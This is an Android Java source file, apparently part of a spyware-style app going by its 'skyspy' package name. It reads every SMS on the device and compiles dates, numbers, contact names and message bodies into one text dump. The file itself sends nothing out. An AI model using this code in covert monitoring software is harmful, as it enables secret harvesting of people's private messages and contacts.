package com.example.skyspy.app.sms;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsReader {

    private Context mContext;

    public SmsReader(Context context) {
        mContext = context;
    }

    public String getSmsList() {
        Uri smsUri = Uri.parse("content://sms/");
        Cursor cur = mContext.getContentResolver().query(smsUri, null, null, null,null);
        String sms = "";
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndexOrThrow("address"));
            sms += "Date: "+getDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
            sms += "Type: "+getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")))+"\n";
            if (number != null) {
                sms += "Number: "+number+"\n";
            } else {
                number = getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")));
                sms += "Number: "+number+"\n";
            }
            sms += "Name: "+getContactName(number)+"\n";
            sms += "Body: "+removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
            sms += "_______________"+"\n\n";
        }
        cur.close();
        return sms;
    }

    public String getNumber(String thread_id){
        String recipient_id = null;
        String number = null;
        Uri convUri = Uri.parse("content://mms-sms/conversations?simple=true");
        String[] projection = new String[] {Telephony.Threads.RECIPIENT_IDS};
        Cursor cur = mContext.getContentResolver().query(convUri, projection, "_id = "+thread_id, null, null);
        if (cur.moveToNext()) {
            recipient_id = cur.getString(cur.getColumnIndexOrThrow("recipient_ids"));
        }
        cur.close();
        if (recipient_id != null) {
            Uri addrUri = Uri.parse("content://mms-sms/canonical-addresses");
            cur = mContext.getContentResolver().query(addrUri, null, "_id = " + recipient_id, null, null);
            if (cur.moveToNext()) {
                number = cur.getString(cur.getColumnIndexOrThrow("address"));
            }
        }
        cur.close();
        return number;
    }

    public String getContactName(String address) {
        String name = null;
        Uri peopleUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
        String[] projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };
        Cursor cur = mContext.getContentResolver().query(peopleUri, projection, null, null, null);
        if (cur.getCount() > 0) {
            cur.moveToFirst();
            name = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        cur.close();
        return name;
    }

    public String getSmsTypeName(Integer type) {
        String str = "";
        if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_ALL) {
            str = "ALL";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_INBOX) {
            str = "INBOX";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_SENT) {
            str = "SENT";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_DRAFT) {
            str = "DRAFT";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_OUTBOX) {
            str = "OUTBOX";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_FAILED) {
            str = "FAILED";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_QUEUED) {
            str = "QUEUED";
        }
        return str;
    }

    public String getDate(Long timeMs) {
        Date date = new Date(timeMs);
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        return df.format(date);
    }

    public String removeNewLine(String str){
        str = str.replace("\n"," ");
        return str;
    }
}
